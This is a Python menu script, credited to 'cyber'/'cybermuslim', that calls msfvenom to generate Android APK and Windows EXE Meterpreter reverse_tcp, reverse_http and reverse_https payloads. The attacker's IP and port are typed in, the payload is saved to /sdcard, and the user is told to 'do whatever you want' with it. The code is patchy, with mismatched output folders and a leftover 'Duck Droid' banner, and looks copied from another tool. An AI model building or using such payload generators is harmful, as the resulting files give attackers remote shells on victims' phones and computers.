
#!/usr/bin/python3 env

# Cooded By : cyber
# Youtube   : https://youtu.be/S2T1FhDXP_0
# Github    : https://github.com/cybermuslim


import os
import time
import Cyber_Muslim as back



type = ["reverse_tcp", "reverse_http", "reverse_https"]
cyan = "\033[1;36m"
blue = "\033[1;34m"
norml= "\033[0m"

def output_pld (output):
	if os.path.exists ("/sdcard/cyber_muslim/"+output) == True:
		back.finaly ()
		print (cyan+"\n\nYour Payload Has generated successfull.\nIt has saved in Your \033[1;31m Internal Storage\n\033[1;36min \033[1;31m  Duck_Droid "+cyan+"  Folder"+cyan+" with the name \n\033[1;31m"+output)
		print (cyan+"\nGo there And do Whatever You  want  To\ndo With it\n\n")
		print ("\n\n	\033[1;36m[\033[1;34m1\033[1;36m]  \033[1;36m Back")
		print ("	\033[1;36m[\033[1;34m2\033[1;36m]  \033[1;36m Exit")
		back_opt = int (input ("\n\n\033[1;34mcyber \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mmuslim\033[1;31m/~  \033[1;36m"))
		if back_opt == 2:
			back.exite ()
		else:
			back.main ()
	else:
		print ("Your Payload has not Generated Successfully. Please Try again.")



def Android ():
	back.banner ()
	android_pld = int (input ("""\033[1;34mSelect type of Android Payload.\n
\033[1;36m[\033[1;34m1\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_tcp
\033[1;36m[\033[1;34m2\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_http
\033[1;36m[\033[1;34m3\033[1;36m]\033[1;34m--->> \033[1;36m android/meterpreter/reverse_https
\033[1;36m[\033[1;34m4\033[1;36m]\033[1;34m--->> \033[1;36m Exit

\033[1;34mcyber \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mmuslim\033[1;31m/~  \033[1;36m"""))

	if android_pld < 4:
		payloads = "android/meterpreter/"+type[android_pld-1]
		lhost = (input ("\n\033[1;34mENTER Local IP :---->>> \033[1;36m ")).replace (" ","")
		lport =  (input ("\033[1;34mENTER Port No. :---->>> \033[1;36m ")).replace (" ","")
		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".apk").replace (" ","")
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o /sdcard/cyber_muslim/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		output_pld (output)

	if android_pld == 4:
		back.exite ()

	if android_pld > 4:
		try:
			raise ValueError
		except ValueError:
			print ("\033[1;34mcyber \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mmuslim\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
			Android ()


def Windows ():
	back.banner ()
	windows_pld = int (input ("""\033[1;34mSelect type of Windows Payload.\n
\033[1;36m[\033[1;34m1\033[1;36m]\033[1;34m--->> \033[1;36m  windows/meterpreter/reverse_tcp
\033[1;36m[\033[1;34m2\033[1;36m]\033[1;34m--->> \033[1;36m  windows/meterpreter/reverse_http
\033[1;36m[\033[1;34m3\033[1;36m]\033[1;34m--->> \033[1;36m  windows/meterpreter/reverse_https
\033[1;36m[\033[1;34m4\033[1;36m]\033[1;34m--->> \033[1;36m Exit

\033[1;34mcyber \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mmuslim\033[1;31m/~  \033[1;36m"""))

	if windows_pld < 4:
		payloads = "windows/meterpreter/"+type[windows_pld-1]
		lhost = (input ("\n\033[1;34mENTER Local IP :---->>> \033[1;36m ")).replace (" ","")
		lport =  (input ("\033[1;34mENTER Port No. :---->>> \033[1;36m ")).replace (" ","")
		output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".exe").replace (" ","")
		pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f exe -o /sdcard/Duck_Droid/"+output
		print (cyan+"Creating Payload...\n")
		os.system (pld)
		output_pld (output)

	if windows_pld == 4:
		back.exite()

	if windows_pld > 4:
		try:
			raise ValueError
		except ValueError:
			print ("\033[1;34mĐûčk \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mĐrôid\033[1;31m/~"+cyan+"  Plz Retry Enter number from given options."+norml)
			time.sleep(3)
			Windows ()



def main ():
	exit ()

if __name__ == "__main__":
	try:
		time.sleep (3)
		exit ()
	except KeyboardInterrupt:
		print ("\n\n\033[1;34mcyber \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mmuslim\033[1;31m/~"+cyan+"  By By"+norml)
	except ValueError:
		print ("\n\n\033[1;34mcyber \033[1;30m~~\033[1;35m|\033[1;34m••\033[1;35m|\033[1;30m~~ \033[1;34mmuslim\033[1;31m/~"+cyan+"  Plz Retry and Enter number from given options."+norml)
	except TypeError:
		print(" Wrong input")
